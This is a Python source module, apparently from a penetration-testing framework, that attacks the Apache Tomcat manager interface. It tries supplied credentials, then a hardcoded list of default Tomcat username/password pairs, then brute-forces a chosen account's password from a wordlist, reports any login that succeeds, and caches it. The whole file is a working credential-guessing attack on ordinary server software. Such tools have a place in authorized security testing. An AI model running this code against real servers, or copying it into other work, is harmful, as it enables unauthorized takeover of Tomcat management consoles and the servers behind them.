from src.platform.tomcat.interfaces import TINTERFACES
from requests.auth import HTTPBasicAuth
from requests.utils import dict_from_cookiejar
from sys import stdout
from log import LOG
import state
import utility

default_credentials = [("tomcat", "tomcat"),
                       ("role1", "role1"),
                       ("admin", "admin"),
                       ("both", "tomcat"),
                       ("admin", "changethis")]

def _auth(usr, pswd, url):
    """
    """
    res = utility.requests_get(url, auth=HTTPBasicAuth(usr, pswd))

    if res.status_code is 200:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return (dict_from_cookiejar(res.cookies), HTTPBasicAuth(usr, pswd))


def checkAuth(ip, port, title, version):
    """
    """

    if title == TINTERFACES.MAN:

        url = "http://{0}:{1}/manager/html".format(ip, port)

        # check with given auth
        if state.usr_auth:
            (usr, pswd) = state.usr_auth.split(":")
            return _auth(usr, pswd, url)

        # else try default credentials
        for (usr, pswd) in default_credentials:
            cook = _auth(usr, pswd, url)
            if cook:
                return cook

        # if we're still here, check if they supplied a wordlist
        if state.bf_wordlist and not state.hasbf:
            
            state.hasbf = True
            wordlist = []
            with open(state.bf_wordlist, "r") as f:
                wordlist = [x.decode("ascii", "ignore").rstrip() for x in f.readlines()]

            utility.Msg("Brute forcing %s account with %d passwords..." %
                                (state.bf_user, len(wordlist)), LOG.DEBUG)

            try:
                for (idx, word) in enumerate(wordlist):
                    stdout.flush()
                    stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"
                                    % (utility.timestamp(), state.bf_user, idx+1, len(wordlist)))

                    cook = _auth(state.bf_user, word, url)
                    if cook:
                        print ''

                        # lets insert these credentials to the default list so we
                        # don't need to bruteforce it each time
                        if not (state.bf_user, word) in default_credentials:
                            default_credentials.insert(0, (state.bf_user, word))

                        utility.Msg("Successful login %s:%s" % (state.bf_user, word),
                                                                LOG.SUCCESS)
                        return cook

                print ''

            except KeyboardInterrupt:
                pass
